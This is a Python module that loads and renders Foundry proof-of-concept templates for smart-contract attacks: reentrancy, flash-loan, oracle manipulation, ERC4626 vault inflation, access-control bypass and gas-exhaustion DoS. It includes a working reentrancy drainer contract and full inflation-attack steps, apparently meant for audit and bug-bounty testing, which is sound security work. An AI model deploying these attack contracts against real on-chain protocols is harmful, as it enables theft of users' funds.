"""
PoC template loader for exploit development.

Provides Foundry test templates for common vulnerability classes.
"""

from pathlib import Path
from dataclasses import dataclass


@dataclass
class PoCTemplate:
    """A PoC template."""
    id: str
    name: str
    vulnerability_type: str
    description: str
    template: str
    placeholders: list[str]
    tags: list[str]


class TemplateLoader:
    """Loads and provides PoC templates."""

    def __init__(self, templates_dir: Path | None = None):
        """Initialize loader.

        Args:
            templates_dir: Path to templates directory
        """
        if templates_dir is None:
            templates_dir = Path(__file__).parent / "templates"
        self.templates_dir = templates_dir
        self._templates: dict[str, PoCTemplate] = {}
        self._loaded = False

    def _load(self) -> None:
        """Load all templates."""
        if self._loaded:
            return

        self._templates = {}

        # Built-in templates
        self._templates.update(self._get_builtin_templates())

        # Load from directory if exists
        if self.templates_dir.exists():
            for sol_file in self.templates_dir.glob("*.sol"):
                try:
                    content = sol_file.read_text()
                    # Parse metadata from comments
                    template = self._parse_template_file(sol_file.stem, content)
                    if template:
                        self._templates[template.id] = template
                except Exception as e:
                    print(f"[!] Failed to load template {sol_file}: {e}")

        self._loaded = True

    def _parse_template_file(self, name: str, content: str) -> PoCTemplate | None:
        """Parse template from file content."""
        # Look for metadata in leading comment block
        vuln_type = name.replace("_", "-")
        description = f"PoC template for {name}"

        return PoCTemplate(
            id=name,
            name=name.replace("_", " ").title(),
            vulnerability_type=vuln_type,
            description=description,
            template=content,
            placeholders=self._extract_placeholders(content),
            tags=[vuln_type],
        )

    def _extract_placeholders(self, content: str) -> list[str]:
        """Extract {{PLACEHOLDER}} patterns from template."""
        import re
        return list(set(re.findall(r'\{\{(\w+)\}\}', content)))

    def _get_builtin_templates(self) -> dict[str, PoCTemplate]:
        """Get built-in templates."""
        return {
            "reentrancy": PoCTemplate(
                id="reentrancy",
                name="Reentrancy Attack",
                vulnerability_type="reentrancy",
                description="Template for classic reentrancy attacks",
                template=REENTRANCY_TEMPLATE,
                placeholders=["TARGET_CONTRACT", "TARGET_FUNCTION", "ATTACK_AMOUNT"],
                tags=["reentrancy", "CEI", "external-call"],
            ),
            "flash_loan": PoCTemplate(
                id="flash_loan",
                name="Flash Loan Attack",
                vulnerability_type="flash-loan",
                description="Template for flash loan based attacks",
                template=FLASH_LOAN_TEMPLATE,
                placeholders=["TARGET_CONTRACT", "LOAN_TOKEN", "LOAN_AMOUNT"],
                tags=["flash-loan", "aave", "manipulation"],
            ),
            "oracle_manipulation": PoCTemplate(
                id="oracle_manipulation",
                name="Oracle Manipulation",
                vulnerability_type="oracle",
                description="Template for oracle/price manipulation attacks",
                template=ORACLE_MANIPULATION_TEMPLATE,
                placeholders=["TARGET_CONTRACT", "POOL_ADDRESS", "MANIPULATION_AMOUNT"],
                tags=["oracle", "price", "AMM", "manipulation"],
            ),
            "inflation_attack": PoCTemplate(
                id="inflation_attack",
                name="ERC4626 Inflation Attack",
                vulnerability_type="vault-inflation",
                description="Template for vault share inflation attacks",
                template=INFLATION_ATTACK_TEMPLATE,
                placeholders=["VAULT_ADDRESS", "ASSET_ADDRESS", "VICTIM_DEPOSIT"],
                tags=["vault", "ERC4626", "inflation", "first-deposit"],
            ),
            "access_control": PoCTemplate(
                id="access_control",
                name="Access Control Bypass",
                vulnerability_type="access-control",
                description="Template for access control vulnerabilities",
                template=ACCESS_CONTROL_TEMPLATE,
                placeholders=["TARGET_CONTRACT", "PROTECTED_FUNCTION"],
                tags=["access-control", "authorization", "privilege"],
            ),
            "dos_gas": PoCTemplate(
                id="dos_gas",
                name="DoS via Gas Exhaustion",
                vulnerability_type="dos",
                description="Template for denial of service via unbounded loops",
                template=DOS_GAS_TEMPLATE,
                placeholders=["TARGET_CONTRACT", "TARGET_FUNCTION", "ARRAY_SIZE"],
                tags=["dos", "gas", "loop", "array"],
            ),
        }

    def get(self, template_id: str) -> PoCTemplate | None:
        """Get a template by ID."""
        self._load()
        return self._templates.get(template_id)

    def get_by_vulnerability(self, vuln_type: str) -> list[PoCTemplate]:
        """Get templates for a vulnerability type."""
        self._load()
        vuln_lower = vuln_type.lower()
        return [
            t for t in self._templates.values()
            if vuln_lower in t.vulnerability_type.lower() or
            any(vuln_lower in tag.lower() for tag in t.tags)
        ]

    def list_all(self) -> list[PoCTemplate]:
        """Get all available templates."""
        self._load()
        return list(self._templates.values())

    def render(self, template_id: str, **kwargs) -> str | None:
        """Render a template with placeholder substitutions."""
        template = self.get(template_id)
        if not template:
            return None

        content = template.template
        for key, value in kwargs.items():
            content = content.replace(f"{{{{{key}}}}}", str(value))

        return content


# ============================================================================
# Built-in Templates
# ============================================================================

REENTRANCY_TEMPLATE = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITarget {
    function deposit() external payable;
    function withdraw() external;
    function balanceOf(address) external view returns (uint256);
}

contract ReentrancyAttack {
    ITarget public target;
    address public owner;
    uint256 public attackCount;

    constructor(address _target) {
        target = ITarget(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= {{ATTACK_AMOUNT}}, "Need ETH");
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= {{ATTACK_AMOUNT}} && attackCount < 10) {
            attackCount++;
            target.withdraw();
        }
    }

    function withdraw() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}

contract ReentrancyPoCTest is Test {
    ITarget target;
    ReentrancyAttack attacker;

    address victim = makeAddr("victim");
    address attackerEOA = makeAddr("attacker");

    function setUp() public {
        // Deploy target contract
        // target = ITarget(address(new {{TARGET_CONTRACT}}()));

        // Fund victim
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        target.deposit{value: 10 ether}();

        // Deploy attacker contract
        vm.prank(attackerEOA);
        attacker = new ReentrancyAttack(address(target));
        vm.deal(attackerEOA, 1 ether);
    }

    function testReentrancyAttack() public {
        uint256 targetBalanceBefore = address(target).balance;
        uint256 attackerBalanceBefore = attackerEOA.balance;

        console.log("Target balance before:", targetBalanceBefore);
        console.log("Attacker balance before:", attackerBalanceBefore);

        // Execute attack
        vm.prank(attackerEOA);
        attacker.attack{value: 1 ether}();

        // Withdraw stolen funds
        vm.prank(attackerEOA);
        attacker.withdraw();

        uint256 targetBalanceAfter = address(target).balance;
        uint256 attackerBalanceAfter = attackerEOA.balance;

        console.log("Target balance after:", targetBalanceAfter);
        console.log("Attacker balance after:", attackerBalanceAfter);

        // Attacker should have profited
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attack should be profitable");
        assertLt(targetBalanceAfter, targetBalanceBefore, "Target should have lost funds");
    }
}
'''

FLASH_LOAN_TEMPLATE = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IFlashLoanReceiver {
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

contract FlashLoanAttack is IFlashLoanReceiver {
    IPool public pool;
    address public target;
    address public owner;

    constructor(address _pool, address _target) {
        pool = IPool(_pool);
        target = _target;
        owner = msg.sender;
    }

    function attack(address token, uint256 amount) external {
        pool.flashLoanSimple(
            address(this),
            token,
            amount,
            "",
            0
        );
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        // ================================================
        // ATTACK LOGIC HERE
        // ================================================
        // You now have `amount` of `asset` to work with
        // Use it to manipulate prices, drain funds, etc.

        // TODO: Add attack logic
        // ITarget(target).vulnerableFunction(...);

        // ================================================
        // REPAY FLASH LOAN
        // ================================================
        uint256 amountOwed = amount + premium;
        IERC20(asset).approve(address(pool), amountOwed);

        return true;
    }

    function withdraw(address token) external {
        require(msg.sender == owner);
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(owner, balance);
    }
}

contract FlashLoanPoCTest is Test {
    // Aave V3 Pool on mainnet
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

    FlashLoanAttack attacker;
    address attackerEOA = makeAddr("attacker");

    function setUp() public {
        // Fork mainnet
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));

        // Deploy attacker
        vm.prank(attackerEOA);
        attacker = new FlashLoanAttack(AAVE_POOL, address(0)); // TODO: Set target
    }

    function testFlashLoanAttack() public {
        address token = {{LOAN_TOKEN}}; // e.g., WETH, USDC
        uint256 amount = {{LOAN_AMOUNT}};

        // Execute attack
        vm.prank(attackerEOA);
        attacker.attack(token, amount);

        // Check profit
        uint256 profit = IERC20(token).balanceOf(address(attacker));
        console.log("Profit:", profit);

        assertGt(profit, 0, "Attack should be profitable");
    }
}
'''

ORACLE_MANIPULATION_TEMPLATE = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface ITarget {
    function getPrice() external view returns (uint256);
    // Add target-specific functions
}

contract OracleManipulationPoCTest is Test {
    IUniswapV2Pair pool;
    ITarget target;

    address attackerEOA = makeAddr("attacker");

    function setUp() public {
        // Fork mainnet
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));

        pool = IUniswapV2Pair({{POOL_ADDRESS}});
        // target = ITarget({{TARGET_CONTRACT}});
    }

    function testOracleManipulation() public {
        // Get initial price
        uint256 priceBefore = target.getPrice();
        console.log("Price before manipulation:", priceBefore);

        // Get pool reserves
        (uint112 reserve0, uint112 reserve1,) = pool.getReserves();
        console.log("Reserve0:", reserve0);
        console.log("Reserve1:", reserve1);

        // Calculate swap to manipulate price
        uint256 manipulationAmount = {{MANIPULATION_AMOUNT}};

        // Perform manipulation (swap to skew reserves)
        address token0 = pool.token0();
        deal(token0, attackerEOA, manipulationAmount);

        vm.startPrank(attackerEOA);
        IERC20(token0).transfer(address(pool), manipulationAmount);

        // Calculate output (simplified, use actual AMM math)
        uint256 amountOut = (manipulationAmount * 997 * reserve1) / (reserve0 * 1000 + manipulationAmount * 997);
        pool.swap(0, amountOut, attackerEOA, "");
        vm.stopPrank();

        // Check manipulated price
        uint256 priceAfter = target.getPrice();
        console.log("Price after manipulation:", priceAfter);

        // Verify price changed significantly
        uint256 priceChange = priceBefore > priceAfter
            ? (priceBefore - priceAfter) * 100 / priceBefore
            : (priceAfter - priceBefore) * 100 / priceBefore;

        console.log("Price change %:", priceChange);
        assertGt(priceChange, 10, "Price should change by more than 10%");
    }
}
'''

INFLATION_ATTACK_TEMPLATE = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC4626} from "@openzeppelin/contracts/interfaces/IERC4626.sol";

contract InflationAttackPoCTest is Test {
    IERC4626 vault;
    IERC20 asset;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        vault = IERC4626({{VAULT_ADDRESS}});
        asset = IERC20({{ASSET_ADDRESS}});

        // Fund attacker and victim
        deal(address(asset), attacker, 1000e18);
        deal(address(asset), victim, {{VICTIM_DEPOSIT}});
    }

    function testInflationAttack() public {
        // Step 1: Attacker is first depositor, deposits minimal amount
        vm.startPrank(attacker);
        asset.approve(address(vault), type(uint256).max);
        uint256 attackerShares = vault.deposit(1, attacker);
        console.log("Attacker initial shares:", attackerShares);
        vm.stopPrank();

        // Step 2: Attacker donates large amount directly to vault
        // This inflates the share price
        vm.prank(attacker);
        asset.transfer(address(vault), 1000e18 - 1);

        // Step 3: Victim deposits
        vm.startPrank(victim);
        asset.approve(address(vault), type(uint256).max);
        uint256 victimDeposit = {{VICTIM_DEPOSIT}};
        uint256 victimShares = vault.deposit(victimDeposit, victim);
        console.log("Victim deposit:", victimDeposit);
        console.log("Victim shares received:", victimShares);
        vm.stopPrank();

        // Step 4: Attacker redeems
        vm.prank(attacker);
        uint256 attackerWithdrawal = vault.redeem(attackerShares, attacker, attacker);
        console.log("Attacker withdrawal:", attackerWithdrawal);

        // Calculate profit
        uint256 attackerProfit = attackerWithdrawal > 1000e18
            ? attackerWithdrawal - 1000e18
            : 0;
        uint256 victimLoss = victimDeposit - vault.convertToAssets(victimShares);

        console.log("Attacker profit:", attackerProfit);
        console.log("Victim loss:", victimLoss);

        // Verify attack was successful
        if (victimShares == 0) {
            console.log("CRITICAL: Victim received 0 shares!");
            assertEq(victimShares, 0, "Victim lost entire deposit");
        }
    }
}
'''

ACCESS_CONTROL_TEMPLATE = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITarget {
    // Add target contract interface
    function owner() external view returns (address);
    // function {{PROTECTED_FUNCTION}}() external;
}

contract AccessControlPoCTest is Test {
    ITarget target;

    address attacker = makeAddr("attacker");
    address admin = makeAddr("admin");

    function setUp() public {
        // Deploy target contract
        // vm.prank(admin);
        // target = ITarget(address(new {{TARGET_CONTRACT}}()));
    }

    function testAccessControlBypass() public {
        // Verify attacker is not admin
        assertNotEq(attacker, admin, "Attacker should not be admin");

        // Try to call protected function as attacker
        vm.prank(attacker);

        // This should fail with proper access control
        // But if vulnerable, it will succeed

        // Option 1: Expect revert (for testing fix)
        // vm.expectRevert();
        // target.{{PROTECTED_FUNCTION}}();

        // Option 2: Call without revert check (to prove vulnerability)
        // target.{{PROTECTED_FUNCTION}}();

        // Verify state change occurred (if function should modify state)
        // assertEq(target.someState(), expectedValue, "Unauthorized state change");
    }

    function testInitializerCanBeCalledTwice() public {
        // For upgradeable contracts, check if initialize can be called again

        // vm.prank(attacker);
        // target.initialize(attacker); // Should fail if properly protected
    }

    function testMissingModifier() public {
        // List functions that should have access control
        // and verify they revert when called by unauthorized user

        vm.startPrank(attacker);

        // vm.expectRevert(); // Uncomment if expecting proper access control
        // target.adminOnlyFunction();

        // vm.expectRevert();
        // target.setParameter(maliciousValue);

        vm.stopPrank();
    }
}
'''

DOS_GAS_TEMPLATE = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITarget {
    // Add target contract interface
    function processArray(uint256[] calldata) external;
    function getArrayLength() external view returns (uint256);
}

contract DoSGasPoCTest is Test {
    ITarget target;

    address attacker = makeAddr("attacker");
    address user = makeAddr("user");

    function setUp() public {
        // Deploy target contract
        // target = ITarget(address(new {{TARGET_CONTRACT}}()));
    }

    function testDoSViaLargeArray() public {
        // Create large array that will exhaust gas
        uint256 arraySize = {{ARRAY_SIZE}};
        uint256[] memory largeArray = new uint256[](arraySize);

        for (uint256 i = 0; i < arraySize; i++) {
            largeArray[i] = i;
        }

        // Measure gas
        uint256 gasBefore = gasleft();

        vm.prank(attacker);
        target.processArray(largeArray);

        uint256 gasUsed = gasBefore - gasleft();
        console.log("Gas used for array of size", arraySize, ":", gasUsed);

        // If gas used approaches block limit, this is a DoS vector
        uint256 blockGasLimit = 30_000_000;
        if (gasUsed > blockGasLimit / 2) {
            console.log("WARNING: Single call uses >50% of block gas limit");
        }
    }

    function testDoSViaUnboundedLoop() public {
        // If the contract has an unbounded loop (e.g., iterating over all users)
        // adding enough entries can make the function uncallable

        // First, populate the array/mapping with many entries
        for (uint256 i = 0; i < 1000; i++) {
            // target.addEntry(i);
        }

        // Now try to call the function that iterates over all entries
        uint256 gasBefore = gasleft();

        // target.{{TARGET_FUNCTION}}();

        uint256 gasUsed = gasBefore - gasleft();
        console.log("Gas used:", gasUsed);
    }

    function testDoSViaPush() public {
        // Test if attacker can grief by pushing elements to make
        // legitimate operations too expensive

        vm.startPrank(attacker);

        // Push many elements
        for (uint256 i = 0; i < 10000; i++) {
            // target.push(i);
        }

        vm.stopPrank();

        // Now legitimate user operation should be too expensive
        vm.prank(user);
        // target.legitimateOperation(); // Will this exceed gas limit?
    }
}
'''
